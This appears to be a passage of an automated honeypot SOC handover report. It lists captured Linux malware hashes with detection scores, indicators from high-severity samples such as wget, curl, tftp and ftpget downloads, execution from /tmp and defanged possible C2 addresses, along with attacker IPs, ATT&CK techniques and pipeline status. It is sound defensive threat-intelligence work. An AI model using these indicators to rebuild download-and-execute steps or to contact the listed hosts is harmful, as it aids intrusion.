| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `77ed8c7518a32663fb766f729075dcdddc355c8d6ebe381092df51bb891e0cfc` | ELF Binary (Linux executable) (x86 32-bit) | `77ed8c7518a32663...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `7a4a3a129b726b53...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `85338e737e8b8c9ff9742ebc5bb0b73d91d441774161ad936f14910259d985ba` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `85338e737e8b8c9f...` | 60/100 | 🟡 MEDIUM | **26/73** 🔴 |
| `85a17fe8e290a224a717445d0f5e819283567101a92945ea10069946dc7e19d8` | Shell Script | `85a17fe8e290a224...` | 56/100 | 🟡 MEDIUM | **16/74** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **44/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` (7a4a3a129b726b531941b41d...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |
| `65.20.211[.]96` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `165.1.75[.]106` | US | Oracle Corporation | **100** ⚠️ | 2 |
| `2.58.172[.]185` | GB | rack400.com - UK Infrastructure Tel : +6531595852 | **100** ⚠️ | 7 |
| `213.101.138[.]172` | LT | Tele2 Lithuania | **100** ⚠️ | 50 |
| `14.33.96[.]3` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `120.193.9[.]169` | CN | China Mobile Communications Corporation | **100** ⚠️ | 27 |
| `111.70.32[.]53` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 50 |
| `181.114.93[.]153` | BO | Comteco Ltda | **100** ⚠️ | 1 |
| `112.29.109[.]174` | CN | China Mobile Communications Corporation | **100** ⚠️ | 45 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 213 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 197 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 17 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 16 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 16 |

---

## 🔕 False Positive Summary (36 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 14 below threshold 25 | 22 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 12 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 287 cases |
| Tool 34  | Credential Extractor        | ✅ 245 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 8 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 74 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 36 filtered (12.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 54 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 36 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 180 priority case(s) shown individually · 25 recon entry/entries in table (7 group(s) consolidating 53 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-12T15:01:29Z_
